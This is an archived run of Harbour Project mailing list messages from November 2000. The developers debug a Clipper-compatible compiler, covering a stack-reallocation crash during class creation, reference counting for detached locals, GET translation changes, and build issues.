I've also tryed compiling everything back with flex (I'm using only
simplex since it came out) but it dies as well (same exception, same
place) so it is not simplex (BTW. I'm not aware of any bug in simplex).

Problem is I still can't run a simple program with 4 objects in it.
:<i>-(((
</I>
regards.


rglab ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio Longo wrote:
</I>&gt;<i> 
</I>&gt;<i> &gt; I removed call to hb_gcAll() from idle.c (which seems to be the only
</I>&gt;<i> &gt; entry point to garbage collector) but:
</I>&gt;<i> 
</I>&gt;<i>   The garbage collector is not a source of a problem. The problem is an
</I>&gt;<i> incorrect reference counting related to detached local variables.
</I>&gt;<i> Currently the detached local variables have their own counter. This
</I>&gt;<i> counter is incremented/decremented correctly. However there is no proper
</I>&gt;<i> incrementation/decrementation for values stored in such detached
</I>&gt;<i> variables.
</I>&gt;<i>   For example (with some over-simplification) if a variable containing
</I>&gt;<i> an array is passed into some functions where the detached variable is
</I>&gt;<i> created then the array reference counter still counts only the original
</I>&gt;<i> variable. So if in some point the original variable has assigned a
</I>&gt;<i> different value then the array can be deallocated even if it is
</I>&gt;<i> referenced by the detached local variable. This can result with core
</I>&gt;<i> dumps if later a detached variable is used - the detached variable still
</I>&gt;<i> points to already deallocated array.
</I>&gt;<i>   Things get even more complicated if objects are used with many
</I>&gt;<i> cross/self referencing. I am still working on it although I think I will
</I>&gt;<i> commit some temporary solution today (I will be not available next few
</I>&gt;<i> days).
</I>&gt;<i> 
</I>&gt;<i> &gt; So it might not be GC to kill class creation code. What about lex/yacc
</I>&gt;<i> &gt; not compiling correctly? Is it possible?
</I>&gt;<i> 
</I>&gt;<i>   No. Please don't make incorrect assumption about flex based on simplex
</I>&gt;<i> bugs.
</I>&gt;<i> 
</I>

-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 06:42:02 2000
Date: Sat Nov  4 06:42:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] TBColumn Class problem

<PRE>Hi Luiz,

yes TBColumn has no picture right now. Was it present in 5.2?

regards.

Luiz Rafael Culik Guimaraes ha scritto:
&gt;<i> 
</I>&gt;<i> Dear Friends
</I>&gt;<i> 
</I>&gt;<i> Manuel Exposito Suarez reported the follow
</I>&gt;<i> &gt;En TBColumn falta la DATA Picture que estan en Clipper 5.2 y 5.3
</I>&gt;<i> 
</I>&gt;<i> In Tbcolumn Class miss the Picture data that is present in Clipper 5.2 and
</I>&gt;<i> 5.3
</I>&gt;<i> 
</I>&gt;<i> Can any one check
</I>&gt;<i> 
</I>&gt;<i> Regards from Brazil
</I>&gt;<i> 
</I>&gt;<i> Luiz Rafael Culik
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 07:13:02 2000
Date: Sat Nov  4 07:13:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>[To Victor]

&quot;I'm not saying it will solve _all_ 10 chars issues&quot;

I was just trying to suggest what I expect others want. :-)  I faced
this ages ago with C4W. :-)

&quot;- C extend functions have some other issues with symbol name length, =

since you've to use full length function names when compiling for Harbour=
, =

and 10 char long ones when compiling for CA-Clipper.&quot;

It's OK: over 2 years ago I made all C4W's code (except any I missed!)
work for 10-char or whatever longer the &quot;host&quot; compiler can do. :-)
(It wasn't for Harbour at that time, though.)

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 07:16:02 2000
Date: Sat Nov  4 07:16:02 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Sat, Nov 04, 2000 at 12:27:59AM -0800, Ron Pinkas wrote:

&gt;<i> It is not necessary abuse that I was attempting to address. I simply
</I>&gt;<i> suggested that it is not really beneficial to have *every* *one* of us
</I>&gt;<i> receive *every* file that one needs to forward, usually to just one or two
</I>&gt;<i> other individuals.
</I>
If people are incapable of sending files to the people they intend them for
don't you think they'll also be incapable of using an alternate resource?

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 07:16:10 2000
Date: Sat Nov  4 07:16:10 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Sat, Nov 04, 2000 at 12:41:02AM -0800, Ron Pinkas wrote:

&gt;<i> It seems that FTP would be far too complicated for this purpose, because
</I>&gt;<i> we should allow anonymous upload, as well as anonymous download from the
</I>&gt;<i> same folder. It also requires an FTP client, and generally speaking
</I>&gt;<i> appears like an over kill.
</I>
Why is an FTP client overkill?

&gt;<i> The attractive aspect of NNTP, from my perspective, was that one can
</I>&gt;<i> easily peek at such archive and download specific files at will. While the
</I>&gt;<i> process of posting and receiving is fairly simple, and I would guess all
</I>&gt;<i> involved have NNTP client.
</I>
How is an FTP client a more complicated method of placing a file into a
given location than using an NNTP client? FTP was designed for the sharing
of files.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 07:47:02 2000
Date: Sat Nov  4 07:47:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>    +source/rtl/tgetint.prg
    *source/rtl/tget.prg
    *hb_slex.bc
    *makefile.bc
    *makefile.vc
    *source/rtl/Makefile
        + tgetint.prg a new file with GetNew(), __GET() and __GETA()
         functions moved here from tget.prg
        * __GET() and __GETA() both create a set/get codeblock on the 
         fly with no macro compilation and with no memvar variables
        * the first argument of __GET() have to be passed by a reference
         if simple variable is used and set/get codeblock is not
         specified
        
    *include/hbapi.h
    *include/hbapiitm.h
        * added hb_itemIncRef/hb_itemDecRef declarations
        * added hb_codeblockIncRef/hb_codeblockDecRef

    *include/hbrddcdx.h
        * added a few more comments
        * added a forward declaration of _CDXTAG structure

    *source/vm/codebloc.c
    *source/vm/itemapi.c
    *source/vm/memvars.c
        * fixed reference counting for detached local variables
        (This should cure many random core dumps/GPFs)

    *source/compiler/harbour.l
    *source/compiler/harbour.y
        *removed the latest Ron's changes
        
    *source/compiler/expropta.c
    *source/macro/macroa.c
    *include/hbexpra.c
        * added support for internal _GET_ -&gt; __GET/__GETA translation
        NOTE: The variable name passed to __GETA can be buggy in some
        cases, for example:
        @ 0,0 GET var(other[ i ]):name[ i, 1 ]
        will pass &quot;var(other&quot; as a variable name (Clipper and Harbour 
        bug) - the correct behaviour will require some more work -
        there is no simple workaround for this currently
        
    *source/pp/pptable.c
        * removed a hard-coded set/get codeblock from _GET_() arguments
          list - it is created in __GET/__GETA now
          NOTE: This is how Clipper works (no variable names conflicts)
          This will break current Simplex implementation !!!
          
Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:01 2000
Date: Sat Nov  4 08:17:01 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] tbcolumn:picture

<PRE>Sorry, deleted the orig. msg so can't reply to it. :-(

Yes, 5.2's TBColumn obj has a Picture ivar.

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:10 2000
Date: Sat Nov  4 08:17:10 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Victor]

&quot;GetNew()
__GET()
__GETA()
... a separate file&quot;

Yes, please.

&quot;CLASS TGet()
... another separate file&quot;

Also yes please.

&quot;GET class along with methods should move to GET.PRG&quot;

And again. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:20 2000
Date: Sat Nov  4 08:17:20 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

&gt;<i>   _GET_( ... __BLK__( &lt;var&gt; ) ...)
</I>&gt;<i> so that special grammar rules can do the right thing but in a more
</I>&gt;<i> general way
</I>
&quot;Do you have in mind any other scenario that would benefit from this
generalization?&quot;

Hmm... well nothing I can put my finger on instantly (sorry!) but
I've definitely cursed Clipper a little about having the hack for
_GET_() but no way to do it in other places.  IIRC I've even created
an oGet for an array element simply to be able to use its block!

If I get a chance to generalise it can I send you the code to look
at?  Feels like the kind of thing that should definitely get peer-
reviewed. :-)

I better get your &amp; Ryszard's changes first...

&gt;<i>   @ ... GET u
</I>
&quot;Fixed&quot;

:<i>-)
</I>
John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:31 2000
Date: Sat Nov  4 08:17:31 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-03 15:50 UTC+0800 Ron Pinkas
 <ron@profit-master.com>

<PRE>[To Ron]

It's going well so far - thanks! &lt;g&gt;

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:42 2000
Date: Sat Nov  4 08:17:42 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>[To Phil / Ron]

I'm one of those with a slow and not exactly cheap connection, but
100K is fine.

Well, not if there are lots of them!  But there's no sign so far of
any such problem.

What do others think?

If the volume of headers on each msg could be reduced it would
probably help more.

(joke)

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:17:53 2000
Date: Sat Nov  4 08:17:53 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>[To Paul Tucker]

&gt;&gt;<i> I had to change macro.y for VC++ (without slx) ...
</I>
&quot;What version of Bison are you using?&quot;

1.24

The change looked reasonable.  Hmm... I also had to change bison.simple
so it #defines YYPARSE_PARAM_DECL only if it's not already def'd.

It was quick &amp; easy to do and it was my first time trying to build
Harbour; I had to make a few changes to get it to work - that _MSC_VER
being another, plus those casts in various files, which I've reported.

I put this one on the back-burner because it seemed like it was just
me and wouldn't be useful to others!  If I've the wrong bison let me
know and I'll get another.  If the changes are useful I'll contrib.
them of course.

John.

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 08:29:02 2000
Date: Sat Nov  4 08:29:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Jean,

I think I've found the cause of exceptions.

during class creation this sequence (classes.1610..1613)

hb_vmPushSymbol( pDynSym-&gt;pSymbol );        /* Push function name      
*/
hb_vmPushNil();
hb_vmFunction( 0 );                         /* Execute super class     
*/

causes a stack growth. Harbour stack is realloc()ed so now it points
somewhere else inside
memory (realloc() return a different pointer if there is not enough
space to grow existing one) but local variable pString still point
inside &quot;old&quot; stack.

I'm able to &quot;fix&quot; my exception simply increasing STACK_INITHB_ITEMS to
1000.

I think we need to change stack handling of harbour (or state it clear
that is not correct to have local variables pointing inside stack since
stack can change its position during runtime).


regards.





JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> To all involved (At least maurillio, Brian and Ryszard),
</I>&gt;<i> 
</I>&gt;<i> After many hours trying to find something wrong with the class
</I>&gt;<i> inheritance, I'm near to admit it's probably not a problem for me.
</I>&gt;<i> 
</I>&gt;<i> Somewhere a pointer became nil when it should not :-((( and I can't
</I>&gt;<i> see any good or bad reason for that in my code. I really hope
</I>&gt;<i> Ryszard could find something wrong, either with it's logic or some
</I>&gt;<i> incompatibility (feel free to point me on Ryszard, so I could help !! )
</I>&gt;<i> between my code and the GC.
</I>&gt;<i> 
</I>&gt;<i> Totaly desesparate ...
</I>&gt;<i> 
</I>&gt;<i> See you all,
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; Maurilio,
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; I can't reproduce your problem here :-((((
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Perhaps, it's my fault, It is possible I have so simplified your
</I>&gt;<i> &gt; &gt; program it does'nt GPF anymore.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Could you please try to compile the 3 files within test.zip attached and
</I>&gt;<i> &gt; &gt; let me know if it GPF or no.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; I think I have the same inheritence you had.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; _Take_CARE_!!!! the name of the files within test.zip will collide
</I>&gt;<i> &gt; &gt; with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Please try it and let me know the result.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Maurilio, Jean,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; The error apeares exactly just like Maurilio described in his posts.
</I>&gt;<i> &gt; I tested this on my Linux box with the same effects as Maurilio had.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; My short investigation showed me that inside __ClsInstSuper func
</I>&gt;<i> &gt; a local variable pString becomes corrupted after recursivley
</I>&gt;<i> &gt; executing
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;          /* Instance a Super class */
</I>&gt;<i> &gt;          hb_vmPushSymbol( pDynSym-&gt;pSymbol );
</I>&gt;<i> &gt;          hb_vmPushNil();
</I>&gt;<i> &gt;          hb_vmFunction( 0 );
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; when this sequence of inheritance is done : TScegliQuery -&gt;
</I>&gt;<i> &gt; TBrowseSQL -&gt; TBrowse -&gt; TObject.  Because pString is simply
</I>&gt;<i> &gt; a pointer to a stack, seems to me that for some reasons  a stack
</I>&gt;<i> &gt; becomes corrupted after some sequence.of execution. You can
</I>&gt;<i> &gt; also reproduce this kind of error by moving a logic done after
</I>&gt;<i> &gt; F2 key press to a separate function.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Seems to me that Ryszard knows much more about this issue
</I>&gt;<i> &gt; (see his email about harbour locals).
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Regards
</I>&gt;<i> &gt; Marek Paliwoda
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 11:34:02 2000
Date: Sat Nov  4 11:34:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>Brian, Victor,

that was my first Harbour code, and I know it has (at least) some memory
leak problem. I will try to fix what I can based on your comments. As to the
REST parameter, I could not find a REAL purpouse for it. The Create issue
was NOT included and so it says on the code. 2nd try.

Harrier


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 12:11:02 2000
Date: Sat Nov  4 12:11:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>Harrier:
&gt;<i>
</I>&gt;<i> that was my first Harbour code,
</I>
and I forgot to mention that I really appreciate it!  I noticed that it was
a &quot;work-in-progress&quot;, but I was just trying to be complete with what I saw.
Thanks again for stepping in and &quot;filling that hole&quot;!

&gt;<i> As to the REST parameter, I could not find a REAL purpouse for it.
</I>
For COPY TO, it is useful to put a file in Natural order, go to the top of
the records that were added when something went wrong, and copy Rest.  But
you are right it is meaningless for append from.

Thanks again,

Brian





</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 12:12:02 2000
Date: Sat Nov  4 12:12:02 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>
&gt;<i> Hi Jean,
</I>&gt;<i>
</I>&gt;<i> I removed call to hb_gcAll() from idle.c (which seems to be the only
</I>&gt;<i> entry point to garbage collector) but:
</I>&gt;<i>
</I>&gt;<i> Exception c0000005 at address 4b675
</I>&gt;<i> Called from TCLASS:CREATE(166)
</I>&gt;<i> Called from TSCEGLIQUERY(19)
</I>&gt;<i> Called from SELEZIONAQUERY(156)
</I>&gt;<i> Called from TSQLEDITOR:KEYBOARDHOOK(123)
</I>&gt;<i> Called from TSQLEDITOR:EDIT(896)
</I>&gt;<i> Called from MAIN(64)
</I>&gt;<i>
</I>&gt;<i> Process terminated by SIGSEGV
</I>&gt;<i> core dumped
</I>&gt;<i> SYS1808:
</I>&gt;<i> Il processo è terminato. Il codice per la diagnostica
</I>&gt;<i> software (codice dell'errore) è  0005.
</I>&gt;<i>
</I>&gt;<i> as you can see it dies in the same manner.
</I>&gt;<i>
</I>&gt;<i> So it might not be GC to kill class creation code. What about
</I>lex/yacc
&gt;<i> not compiling correctly? Is it possible?
</I>&gt;<i>
</I>&gt;<i> I'm using simplex (which works like a charm in my opinion) now I'll
</I>try
&gt;<i> again with flex but I think I've already made such a test without
</I>any
&gt;<i> result.
</I>&gt;<i>
</I>&gt;<i> What about hvw screwing up stack somewhere?
</I>
If I am not missing something this error is to related to GC. Removing
all calls to hb_gcCollectAll() does not help here. Probably this is a
stack managment error.

Marek Paliwoda




</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 12:39:02 2000
Date: Sat Nov  4 12:39:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ryszard,

I agree that the code block should be created inside __GET(), and I also
agree that such code block is more efficient without use of macro (in fact I
was just about to make this change). What I don't understand is _why_ move
this logic into Expression Optimizer? Can you please explain what benefit
does it offer?

I see one clear disadvantage in that it is far less obvious that way. One
would have far more difficult time finding this kind of mangling.

Why change something that is working correctly? (especially if contributed
by someone else!!!)
Was there any bug you can point to?

Very curious,

Ron

&gt;<i>     *source/compiler/harbour.l
</I>&gt;<i>     *source/compiler/harbour.y
</I>&gt;<i>         *removed the latest Ron's changes
</I>&gt;<i>
</I>&gt;<i>     *source/compiler/expropta.c
</I>&gt;<i>     *source/macro/macroa.c
</I>&gt;<i>     *include/hbexpra.c
</I>&gt;<i>         * added support for internal _GET_ -&gt; __GET/__GETA translation
</I>&gt;<i>         NOTE: The variable name passed to __GETA can be buggy in some
</I>&gt;<i>         cases, for example:
</I>&gt;<i>         @ 0,0 GET var(other[ i ]):name[ i, 1 ]
</I>&gt;<i>         will pass &quot;var(other&quot; as a variable name (Clipper and Harbour
</I>&gt;<i>         bug) - the correct behaviour will require some more work -
</I>&gt;<i>         there is no simple workaround for this currently
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 12:45:03 2000
Date: Sat Nov  4 12:45:03 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>&gt;<i> If I am not missing something this error is to related to GC.
</I>Removing
&gt;<i> all calls to hb_gcCollectAll() does not help here. Probably this is
</I>a
&gt;<i> stack managment error.
</I>

Oops !

Sorry, the fix was found before I read next posts.

Marek Paliwoda



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 13:11:01 2000
Date: Sat Nov  4 13:11:01 2000
From: Paul Tucker harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>John,

The Bison listed near the bottom of the download page at Harbour-Project.org
is version 1.25.

That _should_ save you having to modify anything (in future)

(I'm still looking at the _MSC_VER thingy).

Paul

----- Original Message -----
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Saturday, November 04, 2000 8:15 AM
Subject: Re: [Harbour] bug in GET (john)


[To Paul Tucker]

&gt;&gt;<i> I had to change macro.y for VC++ (without slx) ...
</I>
&quot;What version of Bison are you using?&quot;

1.24

The change looked reasonable.  Hmm... I also had to change bison.simple
so it #defines YYPARSE_PARAM_DECL only if it's not already def'd.

It was quick &amp; easy to do and it was my first time trying to build
Harbour; I had to make a few changes to get it to work - that _MSC_VER
being another, plus those casts in various files, which I've reported.

I put this one on the back-burner because it seemed like it was just
me and wouldn't be useful to others!  If I've the wrong bison let me
know and I'll get another.  If the changes are useful I'll contrib.
them of course.

John.



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 14:23:01 2000
Date: Sat Nov  4 14:23:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>2000-11-04 11:17 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * makefile.bc
     + Added missing dependency of source/rtl/tgetint.prg

   * source/rtl/tgetint.prg
     ! Improved __GETA() - No longer uses slow function calls to traverse
array.
       bSetGet much faster because it no longer traverses base array every
time bSetGet is evaluated,
       because final array dimension is now compiled into the bSetGet :-)
     - Removed no longer needed __GetAValue()

   * tests/testread.prg
     + Added multi dimension GET test.


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 15:33:02 2000
Date: Sat Nov  4 15:33:02 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] TBColumn Class problem

<PRE>Maurilio

&gt;<i> yes TBColumn has no picture right now. Was it present in 5.2?
</I>
According to my Clipper 5.2 manual it is present as also Clipper 5.3

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 15:40:03 2000
Date: Sat Nov  4 15:40:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Embedded quotes  error on ['']

<PRE>This code (those are two single quotes):
         cLine = ['']
yields cLine with only ONE  '   instead of two ''

The preprocessor does not change the code!

BTW, yes this is real live code. I have a routine that lets users create
text files that get parsed and macro compiled, so I have to deal with quotes
within quotes within quotes.

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 15:44:01 2000
Date: Sat Nov  4 15:44:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] more embedded quotes

<PRE>So I tried this for a temporary fix, and it doesn't work either!  This is 2
single-quotes as a constant (here inside double-quotes)

cLine = &quot;''&quot;

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:07:02 2000
Date: Sat Nov  4 16:07:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio

&gt;<i> I think I've found the cause of exceptions.
</I>&gt;<i> 
</I>&gt;<i> during class creation this sequence (classes.1610..1613)
</I>&gt;<i> ...
</I>&gt;<i> causes a stack growth. Harbour stack is realloc()ed so now it points
</I>&gt;<i> somewhere else inside
</I>&gt;<i> memory
</I>
Yes, well seen... Really.

&gt;<i>...
</I>&gt;<i> I think we need to change stack handling of harbour (or state it clear
</I>&gt;<i> that is not correct to have local variables pointing inside stack since
</I>&gt;<i> stack can change its position during runtime).
</I>
In fact I think I should had used a copy of pstring instead of  
directly working on the pointer. I even tend to thing it's the same 
with cl*pper. Reading most of my C extend code I see I always 
copy first all string pointer before use it.

I will do a re-read of classes.c with this in mind. After that I will 
post the modif. It could be interesting to retry it after that.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:25:03 2000
Date: Sat Nov  4 16:25:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] NEW TGet bugs (Ryszard)

<PRE>Ryszard,

You recent change have introduced 3 (three) new bugs :-(.

1. _GET_ should not be translated to __GET[A] in Macro Expansions.
2. Array Index should not be Early Binded in GET of Macro Expansions.
3. bSetGet of Object Data is not functional after your change, because it is
not converted to HB_ET_VARREF (and can't be, if I understand it correctly).

Sadly these would have been avoided if you had read my reply to your input:

RP&gt; Ryszard,
RP&gt;
RP&gt; That's the way it is done in Clipper! Clipper does _not_ provide same
for
RP&gt; macros!
RP&gt;
RP&gt; Try the following in Clipper:
RP&gt;
RP&gt; //------ Test.prg ----------//
RP&gt; FUNCTION Main()
RP&gt;
RP&gt;    LOCAL Macro := &quot;aArray[M-&gt;Counter]&quot;
RP&gt;
RP&gt;    PRIVATE aArray := { &quot;Macro&quot; }, Counter := 1
RP&gt;
RP&gt;    CLEAR SCREEN
RP&gt;
RP&gt;    @ 06,10 GET &amp;Macro
RP&gt;
RP&gt;    M-&gt;Counter := 3
RP&gt;
RP&gt;    READ
RP&gt;
RP&gt; RETURN NIL
RP&gt; //------ EOF Test.prg ----------//

Here is a small PRG to demonstrate all 3 bugs:

// -------------------- TestGet.prg ------------------- //
PROCEDURE Main()

   LOCAL cMacro1 := &quot;aVar[nIndex]&quot;, cMacro2 := &quot;_GET_( 'Hello' )&quot;, Dummy :=
&quot;Bla&quot;, GetList := {}
   MEMVAR nIndex, aVar
   PRIVATE aVar := { &quot;Hello&quot; }, nIndex := 1

   CLEAR SCREEN

   Dummy := &amp;cMacro2 // Bug # 1 =&gt; In Clipper will call _GET_()

   @ 10,10 GET Dummy PICTURE &quot;@K!&quot;
   @ 12,10 GET GetList[1]:Picture VALID ( Alert( GetList[1]:Picture ), .T. )
// Bug #2 =&gt; In Clipper bSetGet will work correctly.
   @ 14,10 GET &amp;cMacro1 // Bug #3 =&gt; In Clipper RT Err because Array Index
will be late Binded!

   M-&gt;nIndex := 4

   READ

RETURN

Function _GET_( cMsg )

   @ 24, 00 SAY cMsg

RETURN NIL
// -------------------- EOF TestGet.prg ------------------- //

I have excluded your changes from SimpLex version, and Harbour built with
SimpLex is 100% compatible with Clipper on these GET issues. :-)

Ron


</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 16:39:02 2000
Date: Sat Nov  4 16:39:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>--Message-Boundary-1364
Content-type: text/plain; charset=US-ASCII
Content-transfer-encoding: 7BIT
Content-description: Mail message body

Maurilio,

Could you please do a check with the attached classes.c without 
your stack modification. If it work, I will post it immediately and will 
also read it carrefully to see if I can found any other 'hole' of the 
same type.

&gt;<i> 
</I>&gt;<i> &gt; I think I've found the cause of exceptions.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; during class creation this sequence (classes.1610..1613)
</I>&gt;<i> &gt; ...
</I>&gt;<i> &gt; causes a stack growth. Harbour stack is realloc()ed so now it points
</I>&gt;<i> &gt; somewhere else inside memory
</I>&gt;<i> 
</I>&gt;<i> Yes, well seen... Really.
</I>&gt;<i> 
</I>&gt;<i> &gt;...
</I>&gt;<i> &gt; I think we need to change stack handling of harbour (or state it clear
</I>&gt;<i> &gt; that is not correct to have local variables pointing inside stack since
</I>&gt;<i> &gt; stack can change its position during runtime).
</I>&gt;<i> 
</I>&gt;<i> In fact I think I should had used a copy of pstring instead of  
</I>&gt;<i> directly working on the pointer. I even tend to thing it's the same 
</I>&gt;<i> with cl*pper. Reading most of my C extend code I see I always 
</I>&gt;<i> copy first all string pointer before use it.
</I>&gt;<i> 
</I>&gt;<i> I will do a re-read of classes.c with this in mind. After that I will post
</I>&gt;<i> the modif. It could be interesting to retry it after that.
</I>&gt;<i> 
